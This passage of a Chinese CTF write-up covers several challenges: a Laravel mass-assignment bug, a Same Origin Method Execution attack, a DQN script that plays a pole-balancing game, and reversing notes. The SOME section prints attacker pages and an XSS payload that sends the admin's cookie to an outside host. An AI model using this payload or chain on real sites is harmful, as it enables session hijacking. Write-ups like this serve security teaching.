<p>infomation&#x9875;&#x5C1D;&#x8BD5;&#x628A;&#x8868;&#x5355;&#x4E2D;&#x7684;name&#x5B57;&#x6BB5;&#x6539;&#x6210;amount&#x5B57;&#x6BB5;&#x5E76;&#x63D0;&#x4EA4;&#xFF0C;&#x5373;&#x53EF;&#x5145;&#x503C;&#x3002;</p>
<p>&#x8D2D;&#x4E70;&#x62FF;&#x5230;<code>flag&#xFF1A;hctf{csgo_is_best_fps_game_dA3jf}</code>&#x3002;</p>
<p>&#x63A8;&#x6D4B;&#x6CA1;&#x6709;&#x9650;&#x5B9A;&#x63D0;&#x4EA4;&#x8868;&#x5355;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x53CD;&#x63A8;&#x540E;&#x7AEF;&#x4EE3;&#x7801;&#x53EF;&#x80FD;&#x4E3A;&#x3002;</p>
<pre><code>    public function update(Request $request)
    {
      $user = Info::where(&apos;id&apos;, Auth::id())-&gt;update($request-&gt;all());
    }
</code></pre><p>Laravel &#x4F7F;&#x7528;update&#x65B9;&#x6CD5;&#x6279;&#x91CF;&#x8D4B;&#x503C;&#x65F6;&#x5E94;&#x5728;Model&#x4E2D;&#x58F0;&#x660E;fillable&#x767D;&#x540D;&#x5355;&#x6216;&#x8005;guard&#x9ED1;&#x540D;&#x5355;&#x9650;&#x5236;&#x53C2;&#x6570;&#xFF0C;&#x6216;&#x8005;&#x4F7F;&#x7528;<code>$request-&gt;only()</code>&#x6765;&#x9650;&#x5236;&#x3002;</p>
<h3 id="deserted-place"><a name="deserted-place" class="anchor-navigation-ex-anchor" href="#deserted-place"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.10. Deserted place</h3>
<pre><code>    Deserted place

    Description 
    maybe nothing here 
    flag in admin cookie
    Now Score 820.35
    Team solved 3
</code></pre><p>&#x51FA;&#x9898;&#x601D;&#x8DEF;&#x6765;&#x81EA;&#x4E8E;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x7279;&#x522B;&#x7684;&#x53EB;&#x505A;SOME&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x5168;&#x540D;<code>Same Origin Method Execution</code>&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x79CD;2015&#x5E74;&#x88AB;&#x4EBA;&#x63D0;&#x51FA;&#x6765;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6267;&#x884C;&#x540C;&#x6E90;&#x73AF;&#x5883;&#x4E0B;&#x7684;&#x4EFB;&#x610F;&#x65B9;&#x6CD5;&#xFF0C;2&#x5E74;&#x524D;&#x5C31;&#x6709;&#x4EBA;&#x505A;&#x4E86;&#x5206;&#x6790;&#x3002;</p>
<p><a href="http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf" target="_blank">&#x539F;paper</a><br><a href="http://blog.safedog.cn/?p=13" target="_blank">http://blog.safedog.cn/?p=13</a><br><a href="https://lightless.me/archives/same-origin-method-exection.html" target="_blank">https://lightless.me/archives/same-origin-method-exection.html</a></p>
<p>&#x8FD9;&#x91CC;&#x6211;&#x5C31;&#x4E0D;&#x8BA8;&#x8BBA;&#x5177;&#x4F53;&#x7684;SOME&#x653B;&#x51FB;&#xFF0C;&#x7A0D;&#x540E;&#x6211;&#x4F1A;&#x5728;&#x535A;&#x5BA2;&#x7B49;&#x5730;&#x65B9;&#x66F4;&#x65B0;&#x5177;&#x4F53;&#x7684;&#x5206;&#x6790;&#x3002;</p>
<p>&#x56DE;&#x5230;&#x9898;&#x76EE;&#x3002;</p>
<p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x6709;&#x9650;&#xFF1A;  </p>
<ul>
<li>1&#x3001;&#x767B;&#x9646;  </li>
<li>2&#x3001;&#x6CE8;&#x518C;  </li>
<li>3&#x3001;&#x4FEE;&#x6539;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#xFF08;&#x4FEE;&#x6539;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x540E;&#x6309;&#x56DE;&#x8F66;&#x66F4;&#x65B0;&#x81EA;&#x5DF1;&#x7684;&#x4FE1;&#x606F;&#xFF09;&#x3001;  </li>
<li>4&#x3001;&#x83B7;&#x53D6;&#x968F;&#x673A;&#x4E00;&#x4E2A;&#x4EBA;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x5E76;&#x628A;&#x5B83;&#x7684;&#x4FE1;&#x606F;&#x66F4;&#x65B0;&#x7ED9;&#x6211;&#x81EA;&#x5DF1;</li>
</ul>
<p>&#x7B80;&#x5355;&#x6D4B;&#x8BD5;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x9875;&#x9762;&#x5B58;&#x5728;self-xss&#xFF0C;&#x4F46;&#x95EE;&#x9898;&#x5C31;&#x5728;&#x4E8E;&#x600E;&#x4E48;&#x80FD;&#x66F4;&#x65B0;admin&#x7684;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x3002;</p>
<p>&#x4ED4;&#x7EC6;&#x56DE;&#x987E;&#x7AD9;&#x5185;&#x7684;&#x5404;&#x79CD;&#x4FE1;&#x606F;&#xFF0C;&#x6211;&#x4EEC;&#x80FD;&#x53D1;&#x73B0;&#x6240;&#x6709;&#x7684;&#x66F4;&#x65B0;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x5F00;&#x542F;&#x5B50;&#x7A97;&#x53E3;&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x3002;</p>
<p>edit.php&#x91CC;&#x9762;&#x6709;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;jsonp&#x7684;&#x63A5;&#x53E3;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x51FD;&#x6570;&#xFF0C;&#x7B80;&#x5355;&#x6D4B;&#x8BD5;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x6B63;&#x5219;&#x5339;&#x914D;&#x4E86;<code>.\w+</code>&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x8FD9;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x6267;&#x884C;&#x5DF2;&#x6709;&#x7684;js&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x770B;&#x540E;&#x53F0;&#x7684;&#x4EE3;&#x7801;&#x3002;</p>
<pre><code>    $callback = $_GET[&apos;callback&apos;];  
    preg_match(&quot;/\w+/i&quot;, $callback, $matches);

    ...

    echo &quot;&lt;script&gt;&quot;;
    echo $matches[0].&quot;();&quot;;
    echo &quot;&lt;/script&gt;&quot;;
</code></pre><p>&#x5DF2;&#x6709;&#x7684;&#x51FD;&#x6570;&#x4E00;&#x5171;&#x6709;3&#x4E2A;</p>
<pre><code>    function UpdateProfile(){
        var username = document.getElementById(&apos;user&apos;).value;
        var email = document.getElementById(&apos;email&apos;).value;
        var message = document.getElementById(&apos;mess&apos;).value;

        window.opener.document.getElementById(&quot;email&quot;).innerHTML=&quot;Email: &quot;+email;
        window.opener.document.getElementById(&quot;mess&quot;).innerHTML=&quot;Message: &quot;+message;

        console.log(&quot;Update user profile success...&quot;);
        window.close();
    }

    function EditProfile(){
        document.onkeydown=function(event){
            if (event.keyCode == 13){
                UpdateProfile();
            }
        }
    }

    function RandomProfile(){
        setTimeout(&apos;UpdateProfile()&apos;, 1000);
    }
</code></pre><p>&#x5982;&#x679C;&#x6267;&#x884C;<code>UpdateProfile</code>&#xFF0C;&#x7AD9;&#x5185;&#x5C31;&#x4F1A;&#x628A;&#x5B50;&#x7A97;&#x53E3;&#x7684;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x5230;&#x7236;&#x7A97;&#x53E3;&#x4E2D;&#x3002;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x6CA1;&#x529E;&#x6CD5;&#x63A7;&#x5236;&#x4FEE;&#x6539;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
<p>&#x56DE;&#x987E;&#x7AD9;&#x5185;&#x903B;&#x8F91;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x70B9;&#x51FB;click me&#xFF0C;&#x9996;&#x5148;&#x8BF7;&#x6C42;<code>/edit.php?callback=RandomProfile</code>&#xFF0C;&#x7136;&#x540E;&#x8DF3;&#x8F6C;&#x81F3;&#x4EFB;&#x610F;<code>http://hctf.com/edit.php?callback=RandomProfile&amp;user=xiaoming</code>&#xFF0C;&#x7136;&#x540E;&#x9875;&#x9762;&#x5173;&#x95ED;&#x5E76;&#xFF0C;&#x66F4;&#x65B0;&#x4FE1;&#x606F;&#x5230;&#x5F53;&#x524D;&#x7528;&#x6237;&#x4E0A;&#xFF0C;&#x5047;&#x8BBE;&#x8FD9;&#x91CC;user&#x662F;&#x6211;&#x4EEC;&#x8BBE;&#x5B9A;&#x7684;&#x8FD8;&#x6709;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x7684;user&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;admin&#x7684;&#x4FE1;&#x606F;&#x4E86;&#xFF0C;&#x4F46;&#xFF0C;&#x600E;&#x4E48;&#x80FD;&#x8BA9;admin&#x6253;&#x5F00;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#x5462;&#xFF1F;</p>
<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E2A;&#xFF0C;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x6253;&#x5F00;<code>edit.php?callback=RandomProfile&amp;user=xiaoming</code><br>     <a href="http://static.zybuluo.com/LoRexxar/ik54i9k8irjz1biosk5xnunu/image.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/ik54i9k8irjz1biosk5xnunu/image.png" alt="">
     </a></p>
<p>&#x62A5;&#x9519;&#x4E86;&#xFF0C;&#x4E0D;&#x662F;&#x901A;&#x8FC7;open&#x6253;&#x5F00;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x5BFB;&#x627E;&#x4E0D;&#x5230;&#x9875;&#x9762;&#x5185;&#x7684;<code>window.opener</code>&#x5BF9;&#x8C61;&#xFF0C;&#x4E5F;&#x5C31;&#x6CA1;&#x529E;&#x6CD5;&#x505A;&#x4EFB;&#x4F55;&#x4E8B;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EA;&#x6709;&#x901A;&#x8FC7;SOME&#xFF0C;&#x624D;&#x80FD;&#x64CD;&#x4F5C;&#x540C;&#x6E90;&#x4E0B;&#x7684;&#x7236;&#x7A97;&#x53E3;&#xFF0C;&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5F97;&#x719F;&#x6089;&#x540C;&#x6E90;&#x7B56;&#x7565;&#xFF0C;&#x540C;&#x6E90;&#x7B56;&#x7565;&#x89C4;&#x5B9A;&#xFF0C;&#x53EA;&#x6709;&#x540C;&#x6E90;&#x4E0B;&#x7684;&#x9875;&#x9762;&#x624D;&#x80FD;&#x76F8;&#x4E92;&#x8BFB;&#x5199;&#xFF0C;&#x5982;&#x679C;&#x901A;&#x8FC7;<code>windows.open</code>&#x6253;&#x5F00;&#x7684;&#x9875;&#x9762;&#x662F;&#x540C;&#x6E90;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>window.opener</code>&#x5BF9;&#x8C61;&#x6765;&#x64CD;&#x4F5C;&#x7236;&#x5B50;&#x7A97;&#x53E3;&#x3002;</p>
<p>&#x800C;SOME&#x5C31;&#x662F;&#x57FA;&#x4E8E;&#x8FD9;&#x79CD;&#x7279;&#x6027;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x540C;&#x6E90;&#x4E0B;&#x7684;&#x4EFB;&#x610F;&#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x6700;&#x7EC8;payload&#xFF1A;</p>
<p>vps, 1.html</p>
<pre><code>    &lt;script&gt;
        function start_some() {
            window.open(&quot;2.html&quot;);
            location.replace(&quot;http://desert.2017.hctf.io/user.php&quot;);
        }

        setTimeout(start_some(), 1000);
    &lt;/script&gt;
</code></pre><p>vps, 2.html</p>
<pre><code>    &lt;script&gt;
        function attack() {
            location.replace(&quot;http://desert.2017.hctf.io/edit.php?callback=RandomProfile&amp;user=lorexxar&quot;);
        }

        setTimeout(attack, 2000);

    &lt;/script&gt;
</code></pre><p>&#x5728;lorexxar&#x8D26;&#x6237;&#x7684;message&#x91CC;&#x6DFB;&#x52A0;payload</p>
<pre><code>    &lt;img src=&quot;\&quot; onerror=window.location.href=&apos;http://0xb.pw?cookie=&apos;%2bdocument.cookie&gt;
</code></pre><p>getflag!</p>
<h3 id="a-true-man-can-play-a-palo-one-hundred-time"><a name="a-true-man-can-play-a-palo-one-hundred-time" class="anchor-navigation-ex-anchor" href="#a-true-man-can-play-a-palo-one-hundred-time"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.11. A true man can play a palo one hundred time</h3>
<h4 id="&#x9898;&#x76EE;&#x8BF4;&#x660E;"><a name="&#x9898;&#x76EE;&#x8BF4;&#x660E;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x8BF4;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9898;&#x76EE;&#x8BF4;&#x660E;" class="plugin-anchor" href="#&#x9898;&#x76EE;&#x8BF4;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9898;&#x76EE;&#x8BF4;&#x660E;</h4>
<pre><code>    Question
    Now you have a balance palo.&#x2028;You can move it left or right.&#x2028;Just play hundred time on it.&#x2028;
    Description
    Get request receive two params 
        1.  move, 0 or 1
        2.  id, just your token
    Observation

        1.  pole position x
        2.  a value depend on x
        3.  pole deviate from center &#xCE;&#xB8;
        4.  a value depend on &#xCE;&#xB8;
    Why you failed
    &#xCE;&#xB8; or x &gt; a certain value
</code></pre><p>&#x603B;&#x800C;&#x8A00;&#x4E4B;&#x5C31;&#x662F;&#x4E2A;&#x73A9;&#x68D2;&#x5B50;&#x7684;&#x6E38;&#x620F;(&#x96FE;&#x3002;<br>&#x4E4B;&#x6240;&#x4EE5;&#x51FA;&#x73B0;&#x5728;&#x6700;&#x540E;&#x4E00;&#x9053;&#x8BF7;&#x53BB;&#x95EE;&#x5173;&#x5361;&#x89C4;&#x5219;&#x7684;&#x8BBE;&#x8BA1;&#x8005;&#x3002;<br>&#x56E0;&#x4E3A;ctf&#x672C;&#x6765;&#x4E0D;&#x5E94;&#x8BE5;&#x51FA;&#x73B0;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x6709;&#x610F;&#x628A;&#x8FD9;&#x9898;&#x8BBE;&#x8BA1;&#x5F97;&#x7B80;&#x5355;&#x4E86;&#x4E00;&#x70B9;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;ctf&#x771F;&#x662F;&#x4E0D;&#x8BB2;&#x9053;&#x7406;&#xFF0C;&#x4E5F;&#x5BFC;&#x81F4;&#x8FD9;&#x9053;&#x9898;&#x88AB;&#x5C11;&#x91CF;&#x975E;&#x9884;&#x671F;&#x3002;</p>
<p>&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#x5F3A;&#x5316;&#x5B66;&#x4E60;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x751A;&#x81F3;&#x4E0D;&#x9700;&#x8981;&#x5F3A;&#x5316;&#x5B66;&#x4E60;&#x53BB;&#x89E3;&#x3002;</p>
<h4 id="dqn&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x5B9A;&#x4E49;"><a name="dqn&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x5B9A;&#x4E49;" class="anchor-navigation-ex-anchor" href="#dqn&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x5B9A;&#x4E49;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="dqn&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x5B9A;&#x4E49;" class="plugin-anchor" href="#dqn&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x5B9A;&#x4E49;"><i class="fa fa-link" aria-hidden="true"></i></a>DQN&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x5B9A;&#x4E49;</h4>
<pre><code>import numpy as np
import tensorflow as tf
import requests
import math

class DeepQNetwork:
    def \_\_init\_\_(
            self,
            n_actions,
            n_features,
            learning_rate=0.01,
            reward_decay=0.9,
            e_greedy=0.9,
            replace\_target\_iter=300,
            memory_size=500,
            batch_size=32,
            e\_greedy\_increment=None,
            output_graph=False,
    ):
        self.n_actions = n_actions
        self.n_features = n_features
        self.lr = learning_rate
        self.gamma = reward_decay
        self.epsilon_max = e_greedy
        self.replace\_target\_iter = replace\_target\_iter
        self.memory_size = memory_size
        self.batch_size = batch_size
        self.epsilon_increment = e\_greedy\_increment
        self.epsilon = 0 if e\_greedy\_increment is not None else self.epsilon_max

        \# total learning step
        self.learn\_step\_counter = 0

        \# initialize zero memory \[s, a, r, s_\]
        self.memory = np.zeros((self.memory_size, n_features * 2 + 2))

        \# consist of \[target\_net, evaluate\_net\]
        self.\_build\_net()
        t_params = tf.get_collection(&apos;target\_net\_params&apos;)
        e_params = tf.get_collection(&apos;eval\_net\_params&apos;)
        self.replace\_target\_op = \[tf.assign(t, e) for t, e in zip(t_params, e_params)\]

        self.sess = tf.Session()

        if output_graph:
            \# $ tensorboard --logdir=logs
            \# tf.train.SummaryWriter soon be deprecated, use following
            tf.summary.FileWriter(&quot;logs/&quot;, self.sess.graph)

        self.sess.run(tf.global\_variables\_initializer())
        self.cost_his = \[\]

    def \_build\_net(self):
        \# ------------------ build evaluate_net ------------------
        self.s = tf.placeholder(tf.float32, \[None, self.n_features\], name=&apos;s&apos;)  \# input
        self.q_target = tf.placeholder(tf.float32, \[None, self.n_actions\], name=&apos;Q_target&apos;)  \# for calculating loss
        with tf.variable_scope(&apos;eval_net&apos;):
            \# c\_names(collections\_names) are the collections to store variables
            c_names, n_l1, w_initializer, b_initializer = \
                \[&apos;eval\_net\_params&apos;, tf.GraphKeys.GLOBAL_VARIABLES\], 10, \
                tf.random\_normal\_initializer(0., 0.3), tf.constant_initializer(0.1)  \# config of layers

            \# first layer. collections is used later when assign to target net
            with tf.variable_scope(&apos;l1&apos;):
                w1 = tf.get_variable(&apos;w1&apos;, \[self.n_features, n_l1\], initializer=w_initializer, collections=c_names)
                b1 = tf.get_variable(&apos;b1&apos;, \[1, n_l1\], initializer=b_initializer, collections=c_names)
                l1 = tf.nn.relu(tf.matmul(self.s, w1) + b1)

            \# second layer. collections is used later when assign to target net
            with tf.variable_scope(&apos;l2&apos;):
                w2 = tf.get_variable(&apos;w2&apos;, \[n_l1, self.n_actions\], initializer=w_initializer, collections=c_names)
                b2 = tf.get_variable(&apos;b2&apos;, \[1, self.n_actions\], initializer=b_initializer, collections=c_names)
                self.q_eval = tf.matmul(l1, w2) + b2

        with tf.variable_scope(&apos;loss&apos;):
            self.loss = tf.reduce_mean(tf.squared_difference(self.q_target, self.q_eval))
        with tf.variable_scope(&apos;train&apos;):
            self.\_train\_op = tf.train.RMSPropOptimizer(self.lr).minimize(self.loss)

        \# ------------------ build target_net ------------------
        self.s_ = tf.placeholder(tf.float32, \[None, self.n_features\], name=&apos;s_&apos;)    \# input
        with tf.variable_scope(&apos;target_net&apos;):
            \# c\_names(collections\_names) are the collections to store variables
            c_names = \[&apos;target\_net\_params&apos;, tf.GraphKeys.GLOBAL_VARIABLES\]

            \# first layer. collections is used later when assign to target net
            with tf.variable_scope(&apos;l1&apos;):
                w1 = tf.get_variable(&apos;w1&apos;, \[self.n_features, n_l1\], initializer=w_initializer, collections=c_names)
                b1 = tf.get_variable(&apos;b1&apos;, \[1, n_l1\], initializer=b_initializer, collections=c_names)
                l1 = tf.nn.relu(tf.matmul(self.s_, w1) + b1)

            \# second layer. collections is used later when assign to target net
            with tf.variable_scope(&apos;l2&apos;):
                w2 = tf.get_variable(&apos;w2&apos;, \[n_l1, self.n_actions\], initializer=w_initializer, collections=c_names)
                b2 = tf.get_variable(&apos;b2&apos;, \[1, self.n_actions\], initializer=b_initializer, collections=c_names)
                self.q_next = tf.matmul(l1, w2) + b2

    def store_transition(self, s, a, r, s_):
        if not hasattr(self, &apos;memory_counter&apos;):
            self.memory_counter = 0

        transition = np.hstack((s, \[a, r\], s_))

        \# replace the old memory with new memory
        index = self.memory_counter % self.memory_size
        self.memory\[index, :\] = transition

        self.memory_counter += 1

    def choose_action(self, observation):
        \# to have batch dimension when feed into tf placeholder
        observation = observation\[np.newaxis, :\]

        if np.random.uniform() &lt; self.epsilon:
            \# forward feed the observation and get q value for every actions
            actions_value = self.sess.run(self.q_eval, feed_dict={self.s: observation})
            action = np.argmax(actions_value)
        else:
            action = np.random.randint(0, self.n_actions)
        return action

    def learn(self):
        \# check to replace target parameters
        if self.learn\_step\_counter % self.replace\_target\_iter == 0:
            self.sess.run(self.replace\_target\_op)
            print(&apos;\\ntarget\_params\_replaced\\n&apos;)

        \# sample batch memory from all memory
        if self.memory_counter &gt; self.memory_size:
            sample_index = np.random.choice(self.memory_size, size=self.batch_size)
        else:
            sample_index = np.random.choice(self.memory_counter, size=self.batch_size)
        batch_memory = self.memory\[sample_index, :\]

        q_next, q_eval = self.sess.run(
            \[self.q_next, self.q_eval\],
            feed_dict={
                self.s_: batch_memory\[:, -self.n_features:\],  \# fixed params
                self.s: batch_memory\[:, :self.n_features\],  \# newest params
            })

        \# change q\_target w.r.t q\_eval&apos;s action
        q_target = q_eval.copy()

        batch_index = np.arange(self.batch_size, dtype=np.int32)
        eval\_act\_index = batch_memory\[:, self.n_features\].astype(int)
        reward = batch_memory\[:, self.n_features + 1\]

        q_target\[batch_index, eval\_act\_index\] = reward + self.gamma * np.max(q_next, axis=1)

        \# train eval network
        _, self.cost = self.sess.run(\[self.\_train\_op, self.loss\],
                                     feed_dict={self.s: batch_memory\[:, :self.n_features\],
                                                self.q_target: q_target})
        self.cost_his.append(self.cost)

        \# increasing epsilon
        self.epsilon = self.epsilon + self.epsilon_increment if self.epsilon &lt; self.epsilon_max else self.epsilon_max
        self.learn\_step\_counter += 1
</code></pre><h4 id="&#x5B66;&#x4E60;&#x8FED;&#x4EE3;"><a name="&#x5B66;&#x4E60;&#x8FED;&#x4EE3;" class="anchor-navigation-ex-anchor" href="#&#x5B66;&#x4E60;&#x8FED;&#x4EE3;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x5B66;&#x4E60;&#x8FED;&#x4EE3;" class="plugin-anchor" href="#&#x5B66;&#x4E60;&#x8FED;&#x4EE3;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5B66;&#x4E60;&#x8FED;&#x4EE3;</h4>
<pre><code>x_threshold = 2.4
theta\_threshold\_radians = 1/15*math.pi

RL = DeepQNetwork(n_actions=2,
                  n_features=4,
                  learning_rate=0.01, e_greedy=0.9,
                  replace\_target\_iter=100, memory_size=2000,
                  e\_greedy\_increment=0.001,)

total_steps = 0

for i_episode in range(100):
    json_req = requests.get(url=url, params={&apos;id&apos;: token, &apos;move&apos;: 0}).json()
    observation = json_req\[&apos;observation&apos;\]
    ep_r = 0

    while True:
        action = RL.choose_action(np.array(observation))

        json_req = requests.get(url=url, params={&apos;id&apos;: token, &apos;move&apos;: action}).json()
        try:  observation_ = json_req\[&apos;observation&apos;\]
        except KeyError:
            pass
        print(observation)
        done = not json_req\[&apos;status&apos;\]

        \# the smaller theta and closer to center the better
        x, x_dot, theta, theta_dot = observation_
        r1 = (x_threshold - abs(x))/x_threshold - 0.8
        r2 = (theta\_threshold\_radians - abs(theta))/theta\_threshold\_radians - 0.5
        reward = r1 + r2

        RL.store_transition(observation, action, reward, observation_)

        ep_r += reward
        if total_steps &gt; 1000:
            RL.learn()

        if done:
            count = json_req\[&apos;count&apos;\]
            if count == 100:
                print(json_req\[&apos;flag&apos;\])
            else:
                print(&apos;count:&apos;, json_req\[&apos;count&apos;\])
            break

        observation = observation_
        total_steps += 1
</code></pre><p>Bin</p>
<h3 id="evrq"><a name="evrq" class="anchor-navigation-ex-anchor" href="#evrq"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.12. Evr_Q</h3>
<h4 id="0x00-&#x5199;&#x5728;&#x524D;&#x9762;"><a name="0x00-&#x5199;&#x5728;&#x524D;&#x9762;" class="anchor-navigation-ex-anchor" href="#0x00-&#x5199;&#x5728;&#x524D;&#x9762;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="0x00-&#x5199;&#x5728;&#x524D;&#x9762;" class="plugin-anchor" href="#0x00-&#x5199;&#x5728;&#x524D;&#x9762;"><i class="fa fa-link" aria-hidden="true"></i></a>0x00 &#x5199;&#x5728;&#x524D;&#x9762;</h4>
<p>&#x3000;&#x3000;&#x8FD9;&#x9898;&#x4E00;&#x5F00;&#x59CB;&#x662F;&#x51C6;&#x5907;TLS+SMC+&#x53CD;&#x8C03;&#x8BD5;&#x7684;&#xFF0C;&#x53D1;&#x73B0;&#x653E;&#x5728;&#x7B2C;&#x4E00;&#x9898;&#x6709;&#x4E9B;&#x4E0D;&#x592A;&#x5408;&#x9002;&#xFF0C;&#x5C31;&#x628A;SMC&#x7684;&#x8C03;&#x7528;&#x90E8;&#x5206;&#x5220;&#x6389;&#x4E86;&#x3002;<br>&#x3000;&#xFF08;&#x5176;&#x5B9E;&#x7559;&#x4E0B;&#x4E86;&#x5F69;&#x86CB;&#xFF0C;smc&#x7684;&#x5B9E;&#x73B0;&#x6211;&#x6CA1;&#x6709;&#x5220;XD&#xFF09;<br>&#x3000;<br>&#x3000;&#x3000;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#xFF1A;<br>&#x3000;&#x3000;&#x7528;TLS&#x68C0;&#x6D4B;&#x5DE5;&#x5177;&#x8FDB;&#x7A0B;&#x548C;&#x8C03;&#x8BD5;&#x5668;&#xFF0C;&#x8FDB;&#x5165;&#x4E3B;&#x51FD;&#x6570;&#x540E;&#x5148;&#x68C0;&#x6D4B;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x901A;&#x8FC7;&#x540E;&#x68C0;&#x6D4B;StartCode(&#x5373;flag)&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x5165;&apos;Y&apos;&#x786E;&#x8BA4;CM&#x3002;<br>&#x3000;&#x3000;<br>&#x3000;&#x3000;&#x90E8;&#x5206;&#x7EC6;&#x8282;&#xFF1A;</p>
<blockquote>
<ul>
<li>Win10&#x7684;TLS&#x5728;vs17&#x4E0A;&#x6709;&#x70B9;&#x5C0F;Bug&#xFF0C;&#x53EA;&#x80FD;&#x5728;Debug&#x6A21;&#x5F0F;&#x4E0B;&#x8DD1;&#x8D77;&#x6765;&#xFF0C;&#x4E8E;&#x662F;&#x6CA1;&#x6709;&#x9009;&#x62E9;Release&#x7248;&#x672C;&#xFF0C;&#x5982;&#x679C;&#x7ED9;&#x5927;&#x5BB6;&#x5E26;&#x6765;&#x56F0;&#x6270;&#x8FD9;&#x91CC;&#x5341;&#x5206;&#x62B1;&#x6B49;&#x3002;</li>
<li>&#x7528;&#x6237;&#x540D;&#x6CE8;&#x518C;&#x5B58;&#x5728;&#x591A;&#x89E3;&#xFF0C;&#x539F;&#x56E0;&#x662F;&#x6211;&#x628A;&#x8FDB;&#x4F4D;&#x503C;&#x820D;&#x53BB;&#x4E86;&#xFF08;&#x8F93;&#x5165;&apos;I&apos;&#x4E5F;&#x80FD;&#x901A;&#x8FC7;username&#x9A8C;&#x8BC1;&#x54E6;&#xFF09;</li>
<li>StartCode&#x90E8;&#x5206;&#x5148;&#x9A8C;&#x8BC1;&#x957F;&#x5EA6;&#x4E3A;35<br>Step1: &#x5168;&#x4F53; xor 0x76<br>Step2: [7:14]&#x6BCF;&#x4E2A;&#x5B57;&#x8282;&#x5148;&#x5F02;&#x6216;0xAD, &#x518D;&#x5C06;0b10101010&#x4F4D;&#x4E0E;0b01010101&#x4F4D;&#x4E92;&#x6362;<br>Step3: [14:21]&#x6BCF;&#x4E2A;&#x5B57;&#x8282;&#x5148;&#x5F02;&#x6216;0xBE, &#x518D;&#x5C06;0b11001100&#x4F4D;&#x4E0E;0b00110011&#x4F4D;&#x4E92;&#x6362;<br>Step4: [21:28]&#x6BCF;&#x4E2A;&#x5B57;&#x8282;&#x5148;&#x5F02;&#x6216;0xAD, &#x518D;&#x5C06;0b11110000&#x4F4D;&#x4E8E;0b00001111&#x4F4D;&#x4E92;&#x6362;</li>
<li>Step2~4&#x52A0;&#x5BC6;&#x524D;&#x5148;&#x8C03;&#x7528;ntdll!NtQueryInformationProcess, &#x5404;&#x68C0;&#x67E5;1&#x79CD;&#x6807;&#x5FD7;(7, 30&#xFF0C;31)</li>
